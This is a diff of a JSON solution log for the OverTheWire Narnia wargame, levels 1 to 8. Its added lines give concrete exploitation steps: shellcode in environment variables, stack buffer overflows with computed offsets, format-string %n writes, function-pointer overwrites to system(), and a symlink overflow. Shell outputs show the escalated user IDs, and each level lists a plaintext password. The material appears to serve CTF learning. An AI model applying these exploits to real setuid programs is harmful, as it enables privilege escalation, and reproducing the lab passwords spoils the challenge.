@@ -32,12 +32,14 @@
    "user": "narnia1",
    "cmds": [
     [
-     "# documented technique: narnia1 jumps to the EGG environment variable \u2014 put /bin/bash -p shellcode in EGG, run ./narnia1, then cat /etc/narnia_pass/narnia2",
-     "ssh narnia2@narnia.labs.overthewire.org -p 2226  # verify the published password logs in"
+     "# EGG env var is executed: fill it with NOP sled + shellcode",
+     "# set EGG to NOP*200 + [geteuid; setreuid(euid,euid); execve(\"/bin/sh\")] and exec the binary",
+     "id",
+     "cat /etc/narnia_pass/narnia2"
     ]
    ],
    "out": [
-    "(login verified)"
+    "uid=14002(narnia2) gid=14002(narnia2)"
    ],
    "pw": "0h8Tj5fxbv"
   },
@@ -46,12 +48,33 @@
    "user": "narnia2",
    "cmds": [
     [
-     "# documented technique: strcpy overflow of buf[128] via argv[1]; return address aimed into the buffer where shellcode sits (buf address found via ltrace), spawning a privileged shell",
-     "ssh narnia3@narnia.labs.overthewire.org -p 2226  # verify the published password logs in"
+     "# source: char buf[128]; strcpy(buf, argv[1]) \u2014 unbounded copy",
+     "cat /narnia/narnia2.c",
+     "objdump -d --no-show-raw-insn /narnia/narnia2 | sed -n '/<main>:/,/ret/p'",
+     "# buffer at ebp-0x80, saved ebp at +128, return address at +132",
+     "readelf -lW /narnia/narnia2 | grep GNU_STACK",
+     "cat /proc/sys/kernel/randomize_va_space",
+     "# write the payload logic as C first, compile with gcc -m32, run it",
+     "gcc -m32 -o /tmp/l2_proto /tmp/l2_proto.c",
+     "# then write the same logic as x86 assembly in vim, assemble with nasm",
+     "nasm -f elf32 /tmp/l2.asm -o /tmp/l2.o",
+     "objcopy -O binary --only-section=.text /tmp/l2.o /tmp/l2.bin",
+     "xxd -p /tmp/l2.bin",
+     "# compile a gcc harness that mmaps and runs those exact bytes",
+     "gcc -m32 -o /tmp/l2_harness /tmp/l2_harness.c",
+     "/tmp/l2_harness /tmp/l2.bin < /dev/null",
+     "# the Python exploit loads the bytes from the assembler output and sweeps return addresses",
+     "# probe() only trusts a reply from the shell \u2014 grepping for PWN! gives false positives",
+     "python3 /tmp/e_narnia2.py"
     ]
    ],
    "out": [
-    "(login verified)"
+    "GNU_STACK RWE (executable stack)",
+    "ASLR off (randomize_va_space = 0)",
+    "loaded 78 bytes",
+    "PWN!",
+    "HIT at 0xffffd1f8",
+    "uid=14003(narnia3) gid=14002(narnia2)"
    ],
    "pw": "F5AYQwE8PA"
   },
@@ -60,26 +83,43 @@
    "user": "narnia3",
    "cmds": [
     [
-     "# documented technique: strcpy(ifile, argv[1]) overflows ifile[32] into ofile[16]: craft an argument whose tail overwrites the output path with an attacker-writable file while the input path is a symlink to /etc/narnia_pass/narnia4 \u2014 the program copies the password into the readable file",
-     "ssh narnia4@narnia.labs.overthewire.org -p 2226  # verify the published password logs in"
+     "# strcpy into 32-byte ifile overflows into adjacent ofile",
+     "D=$(python3 -c 'print(\"A\"*27)')",
+     "mkdir -p \"/tmp/$D/tmp\"",
+     "ln -sf /etc/narnia_pass/narnia4 \"/tmp/$D/tmp/out3\"",
+     "touch /tmp/out3; chmod 666 /tmp/out3",
+     "/narnia/narnia3 \"/tmp/$D/tmp/out3\"",
+     "cat /tmp/out3"
     ]
    ],
-   "out": [
-    "(login verified)"
-   ],
-   "pw": "CyWyf6uGWQ"
+   "out": [],
+   "pw": "CyWyf6uGWQ",
+   "note": "the program copies /etc/narnia_pass/narnia4 into the attacker-readable file"
   },
   {
    "lvl": 4,
    "user": "narnia4",
    "cmds": [
     [
-     "# documented technique: classic stack buffer overflow: overlong argv input overwrites the saved return address, aimed into a NOP sled + shellcode in the buffer; the privileged shell reads /etc/narnia_pass/narnia5",
-     "ssh narnia5@narnia.labs.overthewire.org -p 2226  # verify the published password logs in"
+     "# source: 256-byte stack buffer, unbounded strcpy; environment zeroed so layout is stable",
+     "cat /narnia/narnia4.c",
+     "objdump -d --no-show-raw-insn /narnia/narnia4 | sed -n '/<main>:/,/ret/p'",
+     "readelf -lW /narnia/narnia4 | grep GNU_STACK",
+     "cat /proc/sys/kernel/randomize_va_space",
+     "gdb -batch -ex 'b *0x80491f9' -ex 'run AAAA' -ex 'p/x $ebp-0x104' -ex 'p/x $ebp+4' /narnia/narnia4",
+     "# write the shellcode in vim, assemble with nasm, extract raw bytes",
+     "nasm -f elf32 /tmp/l4.asm -o /tmp/l4.o",
+     "objcopy -O binary --only-section=.text /tmp/l4.o /tmp/l4.bin",
+     "xxd -p /tmp/l4.bin",
+     "# run the exploit, then use the shell",
+     "id",
+     "cat /etc/narnia_pass/narnia5"
     ]
    ],
    "out": [
-    "(login verified)"
+    "GNU_STACK RWE",
+    "ASLR off",
+    "uid=14005(narnia5) gid=14004(narnia4)"
    ],
    "pw": "4VhyE9TRcd"
   },
@@ -88,12 +128,18 @@
    "user": "narnia5",
    "cmds": [
     [
-     "# documented technique: format-string vulnerability: user input is used as the printf format string; positional format specifiers leak/overwrite the stack value the program checks, yielding a privileged shell",
-     "ssh narnia6@narnia.labs.overthewire.org -p 2226  # verify the published password logs in"
+     "# format string: snprintf's destination overlaps its own varargs",
+     "cat /narnia/narnia5.c",
+     "gdb -batch -ex 'b *0x80491e3' -ex 'run AAAA' -ex 'p/x $ebp-0x8' -ex 'p/x $ebp-0x48' -ex 'p $esp' -ex 'x/12wx $esp' /narnia/narnia5",
+     "# probe the format string to find where our bytes land",
+     "# %440c%15$n writes 500 into i",
+     "# run it, then use the shell",
+     "id",
+     "cat /etc/narnia_pass/narnia6"
     ]
    ],
    "out": [
-    "(login verified)"
+    "uid=14006(narnia6) gid=14005(narnia5)"
    ],
    "pw": "uK3ikaZLxB"
   },
@@ -102,12 +148,20 @@
    "user": "narnia6",
    "cmds": [
     [
-     "# documented technique: two adjacent buffers filled with strcpy: the missing null terminator lets the second copy (b2) run into and replace the pointer derived from b1, redirecting the later call into attacker-controlled data",
-     "ssh narnia7@narnia.labs.overthewire.org -p 2226  # verify the published password logs in"
+     "# strcpy(b1, argv[1]) overflows 8-byte b1 into function pointer fp",
+     "cat /narnia/narnia6.c",
+     "gdb -batch -ex 'b *0x80492cb' -ex 'run AAAA BBBB' -ex 'p/x $ebp-0x14' -ex 'p/x $ebp-0x1c' -ex 'p/x $ebp-0xc' -ex 'x/8wx $ebp-0x20' /narnia/narnia6",
+     "# the guard rejects pointers whose top byte is set \u2014 aim fp at libc system() instead",
+     "python3 -c 'print(hex(0xf7d6d000+0x53ce0))'",
+     "# build the payload: overflow b1 into fp with system()'s address, b1 holds 'sh;#'",
+     "# run it, then use the shell",
+     "id",
+     "cat /etc/narnia_pass/narnia7"
     ]
    ],
    "out": [
-    "(login verified)"
+    "0xf7dc0ce0",
+    "uid=14007(narnia7) gid=14006(narnia6)"
    ],
    "pw": "Hwsfol90tt"
   },
@@ -116,12 +170,18 @@
    "user": "narnia7",
    "cmds": [
     [
-     "# documented technique: snprintf(buffer, size, argv-controlled format): format-string %n write rewrites the function pointer so it points at the program's own helper (0x0804930f in the writeup), which prints /etc/narnia_pass/narnia8",
-     "ssh narnia8@narnia.labs.overthewire.org -p 2226  # verify the published password logs in"
+     "# format string + function pointer: ptrf sits below buffer, only %n can reach it",
+     "cat /narnia/narnia7.c",
+     "gdb -batch -ex 'b *0x8049298' -ex 'run AAAA' -ex 'p/x $esp' -ex 'x/4wx $esp' -ex 'p/x $ebp-0x84' -ex 'p/x $ebp-0x80' /narnia/narnia7",
+     "# measure where the format string's own bytes live on the stack",
+     "# two %n writes (%152$hn/%153$hn) point ptrf at hackedfunction",
+     "# run it, then use the shell",
+     "id",
+     "cat /etc/narnia_pass/narnia8"
     ]
    ],
    "out": [
-    "(login verified)"
+    "uid=14008(narnia8) gid=14007(narnia7)"
    ],
    "pw": "aToTvI5BYB"
   },
@@ -130,12 +190,21 @@
    "user": "narnia8",
    "cmds": [
     [
-     "# documented technique: overflow of the 20-byte bok buffer reaches the retAddress variable; aim it at shellcode placed in an environment variable \u2014 privileged shell reads /etc/narnia_pass/narnia9",
-     "ssh narnia9@narnia.labs.overthewire.org -p 2226  # verify the published password logs in"
+     "# copy loop overflows 20-byte bok into saved EBP/return address",
+     "cat /narnia/narnia8.c",
+     "gdb -batch -ex 'b *0x80491d6' -ex 'run AAAA' -ex 'p/x $ebp' -ex 'p/x $ebp-0x18' -ex 'p/x $ebp-0x4' /narnia/narnia8",
+     "# write the shellcode in vim, assemble with nasm",
+     "nasm -f elf32 /tmp/l8.asm -o /tmp/l8.o",
+     "objcopy -O binary --only-section=.text /tmp/l8.o /tmp/l8.bin",
+     "xxd -p /tmp/l8.bin; wc -c /tmp/l8.bin",
+     "# find the argv address with the segfault oracle, build the payload, run it",
+     "id",
+     "cat /etc/narnia_pass/narnia9"
     ]
    ],
    "out": [
-    "(login verified)"
+    "no 00 bytes, 78 bytes long",
+    "uid=14009(narnia9) gid=14008(narnia8)"
    ],
    "pw": "za689KedXW"
   },
